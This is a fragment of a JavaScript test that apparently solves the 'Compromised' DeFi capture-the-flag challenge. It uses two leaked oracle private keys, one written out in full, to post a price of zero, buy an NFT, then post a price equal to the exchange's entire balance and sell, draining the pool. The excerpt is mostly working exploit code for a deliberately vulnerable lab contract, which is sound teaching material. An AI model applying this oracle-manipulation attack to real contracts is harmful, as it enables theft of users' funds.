...
describe("Compromised challenge", function () {
  ...
  it("Exploit", async function () {
    ...
    var oracleOne = new ethers.Wallet(PrivateKeyOne, ethers.provider);

    const PrivateKeyTwo =
      "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
    var oracleTwo = new ethers.Wallet(PrivateKeyTwo, ethers.provider);

    // Update price to 0
    await this.oracle.connect(oracleOne).postPrice("DVNFT", 0);
    await this.oracle.connect(oracleTwo).postPrice("DVNFT", 0);
    ...
    //set the amount in the exchange pool as the cost of NFT
    const sellPrice = await ethers.provider.getBalance(this.exchange.address);
    await this.oracle.connect(oracleOne).postPrice("DVNFT", sellPrice);
    await this.oracle.connect(oracleTwo).postPrice("DVNFT", sellPrice);

    //approve the exchange to access the NFT and sell it at max price
    await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
    const sellTx = await this.exchange.connect(attacker).sellOne(0);

    //update the price of the NFT to the initial price
